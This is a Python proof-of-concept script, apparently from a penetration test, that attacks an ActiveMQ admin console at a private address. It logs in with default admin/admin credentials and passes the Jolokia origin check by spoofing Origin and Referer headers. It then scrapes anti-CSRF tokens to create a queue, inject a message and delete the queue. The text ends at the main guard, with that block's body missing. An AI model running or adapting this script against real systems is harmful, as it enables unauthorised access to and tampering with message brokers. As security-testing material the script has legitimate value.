import re
import time
from urllib.parse import urljoin

import requests
from requests.auth import HTTPBasicAuth

BASE = "http://10.117.16.102:8161"
AUTH = HTTPBasicAuth("admin", "admin")

ORIGIN_HEADERS = {
    "Origin": BASE,
    "Referer": urljoin(BASE, "/admin/"),
}

UUID_RE = re.compile(r'name="secret"\s+value="([a-f0-9-]{36})"', re.IGNORECASE)


def extract_secret(html: str) -> str:
    m = UUID_RE.search(html)
    if not m:
        raise RuntimeError("Failed to extract secret token from HTML")
    return m.group(1)


def main() -> int:
    s = requests.Session()
    s.auth = AUTH
    s.verify = False

    # 1) Unauthenticated check
    r = requests.get(urljoin(BASE, "/admin/"), timeout=10)
    print(f"[unauth] GET /admin/ -> {r.status_code}")
    www_auth = r.headers.get("WWW-Authenticate", "")
    print(f"[unauth] WWW-Authenticate: {www_auth}")

    # 2) Authenticated console access (default creds)
    r = s.get(urljoin(BASE, "/admin/"), timeout=10)
    print(f"[auth] GET /admin/ -> {r.status_code}")
    if r.status_code != 200:
        raise RuntimeError("Default credentials did not authenticate successfully")

    # 3) Jolokia without Origin header (application-level denial)
    r = s.get(urljoin(BASE, "/api/jolokia/version"), timeout=10)
    print(f"[jolokia no-origin] HTTP {r.status_code} body_snippet={r.text[:160]!r}")

    # 4) Jolokia with Origin/Referer headers (allowed)
    r = s.get(urljoin(BASE, "/api/jolokia/version"), headers=ORIGIN_HEADERS, timeout=10)
    print(f"[jolokia w/headers] HTTP {r.status_code} body_snippet={r.text[:160]!r}")

    # 5) Create a temporary destination (queue)
    q = f"TMP.POC.{int(time.time())}"
    print(f"[action] Using temporary queue: {q}")

    r = s.get(urljoin(BASE, "/admin/queues.jsp"), timeout=10)
    secret_queues = extract_secret(r.text)
    print(f"[action] Extracted queues.jsp secret: {secret_queues}")

    r = s.post(
        urljoin(BASE, "/admin/createDestination.action"),
        data={
            "JMSDestinationType": "queue",
            "JMSDestination": q,
            "secret": secret_queues,
        },
        timeout=10,
        allow_redirects=False,
    )
    print(f"[action] POST createDestination.action -> {r.status_code} (expected 302)")

    # Confirm queue exists
    r = s.get(urljoin(BASE, "/admin/xml/queues.jsp"), timeout=10)
    exists = f'<queue name="{q}">' in r.text
    print(f"[verify] Queue present in /admin/xml/queues.jsp: {exists}")
    if not exists:
        raise RuntimeError("Queue did not appear after creation")

    # 6) Send a message to the queue
    r = s.get(
        urljoin(BASE, "/admin/send.jsp"),
        params={"JMSDestination": q, "JMSDestinationType": "queue"},
        timeout=10,
    )
    secret_send = extract_secret(r.text)
    print(f"[action] Extracted send.jsp secret: {secret_send}")

    marker = f"AMQ_MSG_{int(time.time())}"
    r = s.post(
        urljoin(BASE, "/admin/sendMessage.action"),
        data={
            "JMSDestinationType": "queue",
            "JMSDestination": q,
            "secret": secret_send,
            "JMSMessageCount": "1",
            "JMSPersistent": "false",
            "JMSMessage": marker,
        },
        timeout=10,
        allow_redirects=False,
    )
    print(f"[action] POST sendMessage.action -> {r.status_code} (expected 302)")

    # Verify enqueueCount/size changed for the queue
    r = s.get(urljoin(BASE, "/admin/xml/queues.jsp"), timeout=10)
    # Minimal verification: locate the queue block and check for size="1" and enqueueCount="1"
    idx = r.text.find(f'<queue name="{q}">')
    if idx == -1:
        raise RuntimeError("Queue block not found during stats verification")
    block = r.text[idx : idx + 500]
    print(f"[verify] Queue XML block snippet: {block.replace(chr(10), ' ')[:220]!r}")
    if 'size="1"' not in block or 'enqueueCount="1"' not in block:
        raise RuntimeError("Queue stats did not reflect the injected message as expected")

    # 7) Cleanup: delete destination (POST form style)
    r = s.post(
        urljoin(BASE, "/admin/deleteDestination.action"),
        data={
            "JMSDestinationType": "queue",
            "JMSDestination": q,
            "secret": secret_queues,
        },
        timeout=10,
        allow_redirects=False,
    )
    print(f"[cleanup] POST deleteDestination.action -> {r.status_code} (expected 302)")

    r = s.get(urljoin(BASE, "/admin/xml/queues.jsp"), timeout=10)
    removed = f'<queue name="{q}">' not in r.text
    print(f"[cleanup] Queue removed from /admin/xml/queues.jsp: {removed}")
    if not removed:
        raise RuntimeError("Cleanup failed: queue still present")

    print("PoC completed successfully.")
    return 0


if __name__ == "__main__":
